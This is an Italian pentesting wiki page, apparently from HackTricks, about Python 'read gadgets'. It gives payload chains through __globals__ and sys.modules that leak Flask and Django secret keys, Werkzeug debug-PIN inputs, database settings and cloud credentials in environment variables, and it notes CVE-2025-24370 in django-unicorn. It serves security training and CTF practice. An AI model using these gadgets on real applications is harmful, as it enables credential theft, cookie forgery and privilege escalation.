# Gadget interni di lettura per Python

{{#include ../../banners/hacktricks-training.md}}

## Informazioni di base

Diverse vulnerabilità come [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) o [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) potrebbero permetterti di **leggere i dati interni di python ma non consentirebbero l'esecuzione di codice**. Di conseguenza, un pentester dovrà sfruttare al meglio questi permessi di lettura per **ottenere privilegi sensibili e escalare la vulnerabilità**.

### Flask - Leggere la chiave segreta

La pagina principale di un'applicazione Flask avrà probabilmente l'oggetto globale **`app`** dove questa **chiave segreta è configurata**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
In questo caso è possibile accedere a questo oggetto semplicemente usando qualsiasi gadget per **access global objects** dalla [**Bypass Python sandboxes page**](bypass-python-sandboxes/index.html).

Nel caso in cui **the vulnerability is in a different python file**, è necessario un gadget per attraversare i file e raggiungere quello principale per **access the global object `app.secret_key`**, cambiare la Flask secret key e poter [**escalate privileges** knowing this key](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Un payload come questo [from this writeup](https://ctftime.org/writeup/36082):
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Usa questo payload per **change `app.secret_key`** (il nome nella tua app potrebbe essere diverso) per poter firmare nuovi cookie di Flask con privilegi maggiori.

### Werkzeug - machine_id e node uuid

[**Using these payload from this writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) potrai accedere a **machine_id** e al nodo **uuid**, che sono i **segreti principali** di cui hai bisogno per [**generate the Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) che puoi usare per accedere alla python console in `/console` se la **debug mode is enabled:**
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Nota che puoi ottenere il **percorso locale sul server di `app.py`** generando un **errore** nella pagina web che **ti fornirà il percorso**.

Se la vulnerabilità si trova in un file python diverso, verifica il trucco Flask precedente per accedere agli oggetti dal file python principale.

### Django - SECRET_KEY e il modulo settings

L'oggetto settings di Django è memorizzato nella cache in `sys.modules` non appena l'applicazione si avvia. Con sole primitive di lettura puoi leak la **`SECRET_KEY`**, le credenziali del database o i salt di firma:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.DATABASES, a.SIGNING_BACKEND)
```
Se il gadget vulnerabile si trova in un altro modulo, scorri prima globals:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
Una volta nota la chiave, puoi forgiare Django signed cookies o tokens in modo simile a Flask.

### Variabili d'ambiente / cloud creds tramite moduli caricati

Molti jail importano ancora `os` o `sys` da qualche parte. Puoi abusare di qualsiasi funzione raggiungibile `__init__.__globals__` per pivotare al modulo `os` già importato ed estrarre le **variabili d'ambiente** contenenti API tokens, cloud keys o flags:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Se l'indice delle sottoclassi è filtrato, usa i loaders:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Le variabili d'ambiente sono frequentemente gli unici segreti necessari per passare da accesso in sola lettura a compromesso completo (cloud IAM keys, database URLs, signing keys, etc.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` (<0.62.0) consentiva la **class pollution** tramite richieste di componenti appositamente costruite. Impostare un percorso di proprietà come `__init__.__globals__` permette a un attaccante di raggiungere i globals del modulo del componente e qualsiasi modulo importato (es. `settings`, `os`, `sys`). Da lì puoi leak `SECRET_KEY`, `DATABASES` o credenziali di servizio senza code execution. La catena di exploit è puramente read-based e usa gli stessi dunder-gadget patterns di cui sopra.

### Gadget collections for chaining

CTF recenti (es. jailCTF 2025) mostrano read chains affidabili costruite solo con accesso agli attributi e enumerazione delle sottoclassi. Liste mantenute dalla community come [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) catalogano centinaia di gadget minimali che puoi combinare per attraversare dagli oggetti a `__globals__`, `sys.modules` e infine ai dati sensibili. Usali per adattarti rapidamente quando indici o nomi di classi differiscono tra le versioni minori di Python.



## Riferimenti

- [Analisi Wiz della django-unicorn class pollution (CVE-2025-24370)](https://www.wiz.io/vulnerability-database/cve/cve-2025-24370)
- [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
{{#include ../../banners/hacktricks-training.md}}
